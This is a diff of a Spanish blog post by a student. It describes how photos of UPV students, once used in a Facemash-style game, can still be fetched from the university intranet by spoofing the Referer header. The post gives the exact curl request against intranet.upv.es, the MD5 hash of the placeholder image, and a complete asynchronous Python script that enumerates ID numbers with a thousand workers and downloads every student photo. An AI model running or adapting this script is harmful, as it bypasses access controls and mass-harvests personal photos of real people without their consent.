@@ -39,7 +39,7 @@
     <title>UPV, Python y muchas fotos &middot; Iván Martín</title>
 
     
-    <meta name="description" content="Contexto Hace ~3 años, cuando estaba en primero, recuerdo recibir por el grupo de clase un enlace a una página hosteada en github. El contenido era un juego al " />
+    <meta name="description" content="Hace más o menos tres años, durante una clase de Introducción a la Programación, mandaron por el grupo de clase un enlace a una página hosteada en github. El co" />
     
 
     <meta name="HandheldFriendly" content="True" />
@@ -97,8 +97,8 @@
     },
     "headline": UPV, Python y muchas fotos,
     "name": UPV, Python y muchas fotos,
-    "wordCount": 92,
-    "timeRequired": "PT1M",
+    "wordCount": 703,
+    "timeRequired": "PT4M",
     "inLanguage": {
       "@type": "Language",
       "alternateName": en
@@ -186,17 +186,111 @@
     <section class="post-content">
       
 
-<h4 id="contexto">Contexto</h4>
+<p>Hace más o menos tres años, durante una clase de Introducción a la Programación, mandaron por el grupo de clase un enlace a una página hosteada en github. El contenido era un juego al estilo <a href="https://en.wikipedia.org/wiki/History_of_Facebook">Facemash</a>, podéis acceder a lo que era el juego <a href="https://web.archive.org/web/20190323204003/http://tonilopezmr.github.io/facemash/">aquí</a>.</p>
 
-<p>Hace ~3 años, cuando estaba en primero, recuerdo recibir por el grupo de clase un enlace a una página hosteada en github. El contenido era un juego al estilo <a href="https://en.wikipedia.org/wiki/History_of_Facebook">Facemash</a>. Podeis acceder a lo que era el juego <a href="https://web.archive.org/web/20190323204003/http://tonilopezmr.github.io/facemash/">aquí</a>, aunque ya no funciona.</p>
+<p><strong>Toda</strong> la clase se puso a jugar.</p>
 
-<p>Era provocativo y por eso la gente entraba.</p>
+<p>Al cabo de unos días la gente encargada de los sistemas hicieron cambios para que las fotos dejasen de ser accesibles sin autenticación. Cuando intentabas acceder a la fotografía de un usuario te devolvian esta imagen:</p>
 
-<h4 id="cómo-fundionaba">¿Cómo fundionaba?</h4>
+<p><img src="https://ivmg.me/images/upv-facemash/no-available.gif" alt="Link" /></p>
 
-<p>Bien, vamos a ir entrando en materia 🤓.</p>
+<h4 id="demos-paso-a-la-chapuza">Demos paso a: La chapuza 🛠</h4>
 
-<p>Realmente no es para nada complejo, la UPV sirve las imágenes de los alumnos en una URL y cada alumno tiene un identificador, por lo que, una url válida sería</p>
+<p>Un año o dos después de que hiciesen los cambios, me dio por mirar bien lo que habian hecho para bloquear el acceso. Antes de indagar suponía que habrían requerido autenticación con el token de sesión y dado que ese token caduca, si a alguien le diese por usarlo para obtener todas las fotos sería tedioso. Además de que podrian ver quién es.</p>
+
+<p>Primero necesitamos saber cómo se sirven las fotos.</p>
+
+<p><img src="https://ivmg.me/images/upv-facemash/blurred-photos-link.png" alt="Link" /></p>
+
+<p>Vemos dos rutas que nos podrian valer: <code>/foto/orla/{id}.gif</code> y <code>/foto/getb/{id}.gif</code>. Además de ver cual es mi identificador: <code>55244399</code>.</p>
+
+<p>Cada <em>asociado</em> tiene un identificador &ldquo;aleatorio&rdquo; (ya hablaremos de esto luego 😂), digo <em>asociado</em> porque el sistema almacena a alumnos, empleados del campus y profesores. En el caso de que pasemos un identificador que no esté asociado a un alumno se nos devolverá la imagen de no disponible.</p>
+
+<p>Bien, ahora que ya sabemos cómo obtener fotos vamos a ver cómo las han protegido.</p>
+
+<p>Como he comentado antes, al protegerlas asumí que lo habrían hecho con el token de sesión, pero si el enlace directamente en otra pestaña del navegador, te devuelven que el recurso no está disponible. En cambio, si pulsas en algunas de las fotos de la pantalla de la orla mostrada anteriormente si que funciona.</p>
+
+<p><img src="https://ivmg.me/images/upv-facemash/wait-what.gif" alt="Wait what" /></p>
+
+<p>Desde el inspector, podemos copiar la petición exacta que ha hecho el navegador para obtener una imagen. Que en formato de petición cURL sería tal que:</p>
+
+<pre><code class="language-bash">curl 'https://intranet.upv.es/foto/getb/55244399.gif'
+-H 'Pragma: no-cache'
+-H 'Accept-Encoding: gzip, deflate, br'
+-H 'Accept-Language: es-ES,es;q=0.9,en;q=0.8'
+-H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75 Safari/537.36'
+-H 'Accept: image/webp,image/apng,image/*,*/*;q=0.8'
+-H 'Referer: https://intranet.upv.es/pls/soalu/sic_al.lis?p_vista=intranet&amp;p_idioma=c&amp;p_caca=2018&amp;P_asi=11566&amp;P_ACTION=generarorla'
+-H 'Cookie: T=foto1; AMFParams=dummy,false,false,false,false,true,mac,10_14_2,chrome,73.0.3683.75; AMFDetect=true; TDp={token}; iacclarge=; UPV_DEBUG=,iacclarge; accesible=HighContrast'
+-H 'Connection: keep-alive'
+-H 'Cache-Control: no-cache'
+--compressed
+</code></pre>
+
+<p>Si quitamos las cosas que no nos interesan y le añadimos <code>--output foto.gif</code> para que nos descargue el archivo, nos quedariamos con:</p>
+
+<pre><code class="language-bash">curl 'https://intranet.upv.es/foto/getb/55244399.gif' -H 'Referer: https://intranet.upv.es/pls/soalu/sic_al.lis?p_vista=intranet&amp;p_idioma=c&amp;p_caca=2018&amp;P_asi=11566&amp;P_ACTION=generarorla' -H 'Cookie: TDp={token};' --output foto.gif
+</code></pre>
+
+<p>Llegados a este punto, tenemos dos headers: <code>TDp</code> (el token?) y <code>Referrer</code>. Y antes ya hemos visto no tendría sentido que fuese el token el que nos permita acceder a la foto, así que la petición mínima con la que nos podemos quedar es:</p>
+
+<pre><code class="language-bash">curl 'https://intranet.upv.es/foto/getb/55244399.gif' -H 'Referer: https://intranet.upv.es/pls/soalu/sic_al.lis' --output foto.gif
+</code></pre>
+
+<p>No es una completa chapuza, ya que ahora no puedes insertar la foto en una web y que cargue. Además de que tampoco puedes cargarla de forma dinamica porque (gracias a Dios) tienen el CORS configurado. Pero si lo que querian era proteger las fotos, sin duda se podría haber hecho mejor.</p>
+
+<p>Ah, creo que los alumnos tienen la posibilidad de configurar una web en un subdominio de <code>*.upv.es</code>, así que 👋🏼 CORS.</p>
+
+<h4 id="con-todos-ustedes-la-descarga">Con todos ustedes: La descarga ⬇️</h4>
+
+<p>Hora de montarse un dataset.</p>
+
+<p>Lo primero que tenemos que tener en cuenta es que si queremos iterar sobre todos los identificadores que existen, nos vamos a enconrar muchas veces con la imagen de que el recurso no está disponible. Por lo que tenemos que encontrar alguna forma de filtrarla. Para esto podemos obtener el MD5 del archivo y listo, en este caso es: <code>eca51b6f7b2b067a1129a44557583a88</code>.</p>
+
+<p>Este fue el script que monté en su momento para descargar las fotos:</p>
+
+<pre><code class="language-python">import asyncio
+import sys
+from hashlib import md5
+
+import aiofiles
+from aiohttp import ClientSession, TCPConnector
+from pypeln import asyncio_task as aio
+
+limit = 1000
+urls = (
+    &quot;https://intranet.upv.es/foto/getb/{}.gif&quot;.format(i)
+    for i in range(int(sys.argv[1]))
+)
+headers = {&quot;Referer&quot;: &quot;https://intranet.upv.es/pls/soalu/sic_al.lis&quot;}
+
+
+async def download(url, session):
+    try:
+        async with session.get(url, headers=headers) as response:
+            response_file = await response.read()
+
+            m = md5()
+            m.update(response_file)
+
+            if m.hexdigest() != &quot;eca51b6f7b2b067a1129a44557583a88&quot;:
+                file_name = url.split(&quot;/&quot;)[5]
+                f = await aiofiles.open(f&quot;photos/{file_name}&quot;, mode=&quot;wb&quot;)
+                await f.write(await response.read())
+                await f.close()
+    except:
+        pass
+
+
+aio.each(
+    download,
+    urls,
+    workers=limit,
+    on_start=lambda: ClientSession(connector=TCPConnector(limit=None)),
+    on_done=lambda _status, session: session.close(),
+    run=True,
+)
+</code></pre>
 
     </section>
 
